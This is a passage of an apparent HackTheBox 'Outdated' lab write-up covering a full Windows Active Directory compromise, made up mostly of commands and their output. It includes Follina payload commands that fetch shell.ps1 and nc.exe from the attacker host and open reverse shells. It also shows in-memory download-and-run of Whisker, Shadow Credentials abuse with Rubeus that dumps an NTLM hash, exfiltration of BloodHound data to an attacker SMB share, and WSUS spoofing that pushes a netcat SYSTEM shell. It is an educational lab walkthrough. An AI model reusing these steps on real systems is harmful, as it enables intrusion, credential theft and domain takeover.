Net.Webclient).DownloadString(\u0026#39;http://10.10.16.5/shell.ps1\u0026#39;)\u0026#34; -u 10.10.16.5 -P 80 Generated \u0026#39;clickme.rtf\u0026#39; in current directory Generated \u0026#39;exploit.html\u0026#39; in \u0026#39;www\u0026#39; directory Serving payload on http://10.10.16.5:80/exploit.html And we receive our connection User whoami PS C:\\users\\btables\u0026gt; whoami outdated\\btables PS C:\\users\\btables\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group OUTDATED\\ITStaff Group S-1-5-21-4089647348-67660539-4016542185-1107 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 PS C:\\users\\btables\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled systeminfo PS C:\\Users\\btables\\AppData\\Local\\Temp\\SDIAG_52231ba7-7e35-4c18-9657-51b2de4f57ad\u0026gt; systeminfo Host Name: CLIENT OS Name: Microsoft Windows 10 Enterprise N OS Version: 10.0.19043 N/A Build 19043 OS Manufacturer: Microsoft Corporation OS Configuration: Member Workstation OS Build Type: Multiprocessor Free Registered Owner: setup Registered Organization: Product ID: 00330-00182-51735-AA058 Original Install Date: 6/15/2022, 8:20:38 AM System Boot Time: 9/4/2023, 7:49:45 PM System Manufacturer: Microsoft Corporation System Model: Virtual Machine System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: American Megatrends Inc. 090007 , 5/18/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC-08:00) Pacific Time (US \u0026amp; Canada) Total Physical Memory: 1,610 MB Available Physical Memory: 469 MB Virtual Memory: Max Size: 2,250 MB Virtual Memory: Available: 903 MB Virtual Memory: In Use: 1,347 MB Page File Location(s): C:\\pagefile.sys Domain: outdated.htb Logon Server: \\\\DC Hotfix(s): 4 Hotfix(s) Installed. [01]: KB4601554 [02]: KB5000736 [03]: KB5001330 [04]: KB5001405 Network Card(s): 1 NIC(s) Installed. [01]: Microsoft Hyper-V Network Adapter Connection Name: Ethernet DHCP Enabled: No IP address(es) [01]: 172.16.20.20 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. ipconfig PS C:\\Users\\btables\\AppData\\Local\\Temp\\SDIAG_52231ba7-7e35-4c18-9657-51b2de4f57ad\u0026gt; ipconfig Windows IP Configuration Ethernet adapter Ethernet: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 172.16.20.20 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.16.20.1 Looks like we are inside container, since the ip and hostname are different But the domain is outdated.htb I will download SharpHound and run it iwr -uri http://10.10.16.5/SharpHound/SharpHound.exe -outfile sharphound.exe PS C:\\users\\btables\u0026gt; .\\sharphound.exe -c all 2023-09-05T17:33:21.5510063-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound 2023-09-05T17:33:21.8478592-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-09-05T17:33:21.8947387-07:00|INFORMATION|Initializing SharpHound at 5:33 PM on 9/5/2023 2023-09-05T17:33:22.5084762-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-09-05T17:33:22.7584794-07:00|INFORMATION|Beginning LDAP search for outdated.htb 2023-09-05T17:33:22.8678630-07:00|INFORMATION|Producer has finished, closing LDAP channel 2023-09-05T17:33:22.8678630-07:00|INFORMATION|LDAP channel closed, waiting for consumers 2023-09-05T17:33:53.7567707-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM 2023-09-05T17:34:13.7850701-07:00|INFORMATION|Consumers finished, closing output channel 2023-09-05T17:34:13.8474706-07:00|INFORMATION|Output channel closed, waiting for output task to complete Closing writers 2023-09-05T17:34:14.0005105-07:00|INFORMATION|Status: 97 objects finished (+97 1.901961)/s -- Using 44 MB RAM 2023-09-05T17:34:14.0161334-07:00|INFORMATION|Enumeration finished in 00:00:51.2598743 2023-09-05T17:34:14.0786481-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings. 58 name to SID mappings. 1 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-09-05T17:34:14.0942886-07:00|INFORMATION|SharpHound Enumeration Completed at 5:34 PM on 9/5/2023! Happy Graphing! PS C:\\users\\btables\u0026gt; ls Directory: C:\\users\\btables Mode LastWriteTime Length Name ---- ------------- ------ ---- d-r--- 6/15/2022 9:57 AM 3D Objects d----- 6/16/2022 7:14 PM AutoLogon d-r--- 6/15/2022 9:57 AM Contacts d-r--- 6/15/2022 9:57 AM Desktop d-r--- 6/17/2022 11:51 PM Documents d-r--- 6/15/2022 11:10 PM Downloads d-r--- 6/15/2022 9:57 AM Favorites d-r--- 6/15/2022 9:57 AM Links d-r--- 6/15/2022 9:57 AM Music d-r--- 6/15/2022 9:58 AM OneDrive d-r--- 6/15/2022 9:58 AM Pictures d-r--- 6/15/2022 9:57 AM Saved Games d-r--- 6/15/2022 9:57 AM Searches d-r--- 6/15/2022 9:57 AM Videos -a---- 9/5/2023 5:34 PM 11910 20230905173413_BloodHound.zip -a---- 9/5/2023 5:34 PM 8677 MjdhMDc5MjItNDk4MS00NjFiLWFkY2ItZjQ0ZTBlODI3Mzhh.bin -a---- 9/5/2023 5:31 PM 1051648 sharphound.exe Let\u0026rsquo;s download it our box PS C:\\users\\btables\u0026gt; copy 20230905173413_BloodHound.zip \\\\10.10.16.5\\share\\ └─$ impacket-smbserver share $(pwd) -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.175,49889) [*] AUTHENTICATE_MESSAGE (OUTDATED\\btables,CLIENT) [*] User CLIENT\\btables authenticated successfully [*] btables::OUTDATED:aaaaaaaaaaaaaaaa:b70a1005340ab4228539da15e69d2a4d:0101000000000000005aae711fe0d901e6cae862a6fb10a70000000001001000440065006e004500700070006900640003001000440065006e00450070007000690064000200100073006c0062004e007800620072004e000400100073006c0062004e007800620072004e0007000800005aae711fe0d9010600040002000000080030003000000000000000000000000020000068587445768fe1e138b038c913b94f9169a88007a37692f3f0a8fe886c78a8060a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0035000000000000000000 [*] Connecting Share(1:IPC$) [*] Connecting Share(2:share) [*] Disconnecting Share(1:IPC$) [*] Disconnecting Share(2:share) [*] Closing down connection (10.10.11.175,49889) [*] Remaining connections [] Run neo4j and bloodhound We see that btables is a memberof itstaff@outdated.htb which has AddKeyCredentialLink to sflowers It\u0026rsquo;s a Shadow Credentials https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials I will use PowerSharpPack for Whisker PS C:\\Users\\btables\u0026gt; iex(New-Object net.webclient).downloadString(\u0026#39;http://10.10.16.5:443/PowerSharpPack/PowerSharpBinaries/Invoke-Whisker.ps1\u0026#39;) iex(New-Object net.webclient).downloadString(\u0026#39;http://10.10.16.5:443/PowerSharpPack/PowerSharpBinaries/Invoke-Whisker.ps1\u0026#39;) PS C:\\Users\\btables\u0026gt; Invoke-Whisker -command \u0026#34;add /target:sflowers\u0026#34; Invoke-Whisker -command \u0026#34;add /target:sflowers\u0026#34; [*] No path was provided. The certificate will be printed as a Base64 blob [*] No pass was provided. The certificate will be stored with the password JSXTw8ZbdTDLw9Ib [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Generating certificate [*] Certificate generaged [*] Generating KeyCredential [*] KeyCredential generated with DeviceID 46daa04a-a0a3-4c32-92ff-d92db1407221 [*] Updating the msDS-KeyCredentialLink attribute of the target object [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] You can now run Rubeus with the following syntax: Rubeus.exe asktgt /user:sflowers /certificate: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 /password:\u0026#34;JSXTw8ZbdTDLw9Ib\u0026#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show Let\u0026rsquo;s run Rubeus In case you will issues with Powershell shell, I suggest to migrate to nc.exe python3 ./follina.py -t rtf -m command -c \u0026quot;IWR http://10.10.16.5/nc.exe -outfile C:\\\\programdata\\\\nc.exe; C:\\\\programdata\\\\nc.exe 10.10.16.5 6666 -e cmd\u0026quot; -u 10.10.16.5 -P 80 PS C:\\Users\\btables\u0026gt; .\\Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggY ... /password:\u0026#34;JSXTw8ZbdTDLw9Ib\u0026#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0 [*] Action: Ask TGT [*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers [*] Building AS-REQ (w/ PKINIT preauth) for: \u0026#39;outdated.htb\\sflowers\u0026#39; [*] Using domain controller: 172.16.20.1:88 [+] TGT request successful! [*] base64(ticket.kirbi): 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 ServiceName : krbtgt/outdated.htb ServiceRealm : OUTDATED.HTB UserName : sflowers UserRealm : OUTDATED.HTB StartTime : 9/5/2023 6:27:00 PM EndTime : 9/6/2023 4:27:00 AM RenewTill : 9/12/2023 6:27:00 PM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : rc4_hmac Base64(key) : gKF30Vx/YCi2cukpuc2uyw== ASREP (key) : A9206537D5A0C9F54CC0664ADE22E267 [*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : 1FCDB1F6015DCB318CC77BB2BDA14DB5 Now we have NTLM hash for sflowers sflowers:1FCDB1F6015DCB318CC77BB2BDA14DB5 We saw from bloodhound that sflowers is a member of REMOTE MANAGEMENT USERS, so we can winrm We could also net user sflowers /domain to get domain group information Root We know sflowers is a member of WSUS ADMINISTRATORS So let\u0026rsquo;s check registry https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus We see the http://wsus.outdated.htb:8530 And it\u0026rsquo;s the box itself *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Get-ItemProperty HKLM:\\software\\policies\\microsoft\\windows\\WindowsUpdate SetActiveHours : 1 ActiveHoursStart : 0 ActiveHoursEnd : 23 AcceptTrustedPublisherCerts : 1 ExcludeWUDriversInQualityUpdate : 1 DoNotConnectToWindowsUpdateInternetLocations : 1 WUServer : http://wsus.outdated.htb:8530 WUStatusServer : http://wsus.outdated.htb:8530 UpdateServiceUrlAlternate : PSPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\policies\\microsoft\\windows\\WindowsUpdate PSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\policies\\microsoft\\windows PSChildName : WindowsUpdate PSDrive : HKLM PSProvider : Microsoft.PowerShell.Core\\Registry *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; nslookup wsus.outdated.htb Server: localhost Address: 127.0.0.1 Name: dc.outdated.htb Addresses: dead:beef::ccdc:5087:ac10:8c9f dead:beef::1a8 10.10.11.175 172.16.20.1 Aliases: wsus.outdated.htb There is a nice post regarding what we can do with WSUS https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing SharpWSUS Or Precompiled one I\u0026rsquo;ll upload SharpWSUS and nc to box According to post above: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to that binary The post shows us the way to bypass it using psexec which I also have to download to box https://learn.microsoft.com/en-us/sysinternals/downloads/psexec So now we can perform the attack *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; ls Directory: C:\\Users\\sflowers\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/5/2023 6:54 PM 45272 nc.exe -a---- 9/5/2023 6:59 PM 833472 psexec.exe -a---- 9/5/2023 6:51 PM 49152 SharpWSUS.exe So let\u0026rsquo;s create a patch *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\SharpWSUS.exe create /payload:\u0026#34;C:\\Users\\sflowers\\Documents\\psexec.exe\u0026#34; /args:\u0026#34; -accepteula -s -d C:\\Users\\sflowers\\Documents\\nc.exe -e cmd.exe 10.10.16.5 7777\u0026#34; /title:\u0026#34;System Shell Update\u0026#34; ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Create Update [*] Creating patch to use the following: [*] Payload: psexec.exe [*] Payload Path: C:\\Users\\sflowers\\Documents\\psexec.exe [*] Arguments: -accepteula -s -d C:\\Users\\sflowers\\Documents\\nc.exe -e cmd.exe 10.10.16.5 7777 [*] Arguments (HTML Encoded): -accepteula -s -d C:\\Users\\sflowers\\Documents\\nc.exe -e cmd.exe 10.10.16.5 7777 ################# WSUS Server Enumeration via SQL ################## ServerName, WSUSPortNumber, WSUSContentLocation ----------------------------------------------- DC, 8530, c:\\WSUS\\WsusContent ImportUpdate Update Revision ID: 30 PrepareXMLtoClient InjectURL2Download DeploymentRevision PrepareBundle PrepareBundle Revision ID: 31 PrepareXMLBundletoClient DeploymentRevision [*] Update created - When ready to deploy use the following command: [*] SharpWSUS.exe approve /updateid:4277d916-4059-4390-bd53-9ca182a9fab6 /computername:Target.FQDN /groupname:\u0026#34;Group Name\u0026#34; [*] To check on the update status use the following command: [*] SharpWSUS.exe check /updateid:4277d916-4059-4390-bd53-9ca182a9fab6 /computername:Target.FQDN [*] To delete the update use the following command: [*] SharpWSUS.exe delete /updateid:4277d916-4059-4390-bd53-9ca182a9fab6 /computername:Target.FQDN /groupname:\u0026#34;Group Name\u0026#34; [*] Create complete Now we approve it *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\SharpWSUS.exe approve /updateid:4277d916-4059-4390-bd53-9ca182a9fab6 /computername:dc.outdated.htb /groupname:\u0026#34;System Shell Update\u0026#34; ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Approve Update Targeting dc.outdated.htb TargetComputer, ComputerID, TargetID ------------------------------------ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1 Group Exists = False Group Created: System Shell Update Added Computer To Group Approved Update [*] Approve complete We can check the status We have to wait for several minutes for it to complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\SharpWSUS.exe check /updateid:4277d916-4059-4390-bd53-9ca182a9fab6 /computername:dc.outdated.htb ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Check Update Targeting dc.outdated.htb TargetComputer, ComputerID, TargetID ------------------------------------ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1 [*] Update is not installed [*] Check complete If we check after few minutes, we see it\u0026rsquo;s installed And we have our shell *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\SharpWSUS.exe check /updateid:4277d916-4059-4390-bd53-9ca182a9fab6 /computername:dc.outdated.htb ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Check Update Targeting dc.outdated.htb TargetComputer, ComputerID, TargetID ------------------------------------ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1 [*] Update is installed [*] Check complete There are skipped steps explained by 0xdf ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/outdated/images/outdated.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/outdated/","summary":"Outdated Enumeration nmap └─$ nmap -Pn -p- 10.10.11.175 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 20:50 BST Nmap scan report for 10.10.11.175 (10.10.11.175) Host is up (0.16s latency). Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE 25/tcp open smtp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 8530/tcp open unknown 8531/tcp open unknown 9389/tcp open adws 49667/tcp open unknown 49685/tcp open unknown 49686/tcp open unknown 49689/tcp open unknown 49928/tcp open unknown 52597/tcp open unknown └─$ nmap -Pn 